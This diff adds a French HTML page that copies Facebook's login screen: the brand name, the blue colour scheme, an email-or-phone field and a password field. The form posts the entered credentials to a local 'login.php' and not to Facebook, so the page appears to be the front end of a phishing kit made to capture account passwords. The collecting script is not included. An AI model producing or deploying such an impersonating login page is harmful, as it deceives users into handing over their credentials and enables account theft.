@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion à Facebook</title>
+  <style>
+    body {
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+    .container {
+      text-align: center;
+    }
+    .form-box {
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 100%;
+      margin-top: 20px;
+    }
+    .logo {
+      font-size: 3rem;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    button {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #1877f2;
+      color: white;
+      font-size: 1.1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 1rem;
+    }
+    button:hover {
+      background-color: #166fe5;
+    }
+    .link {
+      display: block;
+      color: #1877f2;
+      font-size: 0.9rem;
+      text-decoration: none;
+      margin-bottom: 1rem;
+    }
+    .create-account {
+      background: #42b72a;
+      margin-top: 1rem;
+    }
+    .create-account:hover {
+      background: #36a420;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">facebook</div>
+  <div class="form-box">
+    <form method="POST" action="login.php">
+  <input type="text" name="identifiant" placeholder="Adresse e-mail ou numéro de téléphone" required>
+  <input type="password" name="password" placeholder="Mot de passe" required>
+  <button type="submit">Se connecter</button>
+  <a href="#" class="link">Mot de passe oublié ?</a>
+  <hr>
+  <button type="button" class="create-account">Créer nouveau compte</button>
+</form>
+  </div>
+</div>
+
+</body>
+</html>
